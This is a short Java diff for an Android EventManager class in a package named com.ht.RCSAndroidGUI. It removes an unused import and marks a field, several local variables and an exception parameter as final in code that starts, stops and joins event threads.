@@ -15,7 +15,6 @@ import android.util.Log;
 
 import com.ht.RCSAndroidGUI.Manager;
 import com.ht.RCSAndroidGUI.Status;
-import com.ht.RCSAndroidGUI.agent.AgentBase;
 import com.ht.RCSAndroidGUI.utils.Check;
 
 // TODO: Auto-generated Javadoc
@@ -35,7 +34,7 @@ public class EventManager extends Manager {
 
 	/** The running. */
 	private final HashMap<Integer, EventBase> running;
-	private HashMap<EventBase, Thread> threads;
+	private final HashMap<EventBase, Thread> threads;
 
 	/**
 	 * Self.
@@ -173,7 +172,7 @@ public class EventManager extends Manager {
 
 				e.parse(pairs.getValue());
 				if (e.getStatus() != Event.EVENT_RUNNING) {
-					Thread t = new Thread(e);
+					final Thread t = new Thread(e);
 					t.start();
 					threads.put(e, t);
 
@@ -196,20 +195,20 @@ public class EventManager extends Manager {
 
 		while (it.hasNext()) {
 			final Map.Entry<Integer, EventBase> pairs = it.next();
-			EventBase event = pairs.getValue();
+			final EventBase event = pairs.getValue();
 
 			Log.d(TAG, "Stopping: " + event);
 
 			if (event.getStatus() == Event.EVENT_RUNNING) {
 				event.stopThread();
 				try {
-					Thread t = threads.get(event);
+					final Thread t = threads.get(event);
 					Check.asserts(t != null, "Null thread");
 
 					t.join();
 					threads.remove(event);
 
-				} catch (InterruptedException e) {
+				} catch (final InterruptedException e) {
 					e.printStackTrace();
 					Log.e(TAG, e.toString());
 				}
